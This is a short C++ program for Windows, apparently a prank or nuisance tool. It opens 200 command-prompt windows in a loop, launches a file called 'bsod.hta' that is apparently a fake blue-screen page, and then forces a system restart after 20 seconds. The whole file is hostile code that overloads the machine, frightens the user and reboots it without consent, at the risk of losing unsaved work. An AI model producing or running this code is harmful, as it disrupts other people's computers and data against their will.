#include<iostream>
#include<windows.h>
using namespace std;
int main()
{
	for(int i=0;i<200;i++)
	{
		system("cmd/c\"start");
		
	}
	ShellExecute(NULL,"open","bsod.hta",NULL,NULL,SW_NORMAL);
	Sleep(2000);
	system("c:\\windows\\system32\\shutdown /r /t 20\n\n");
}
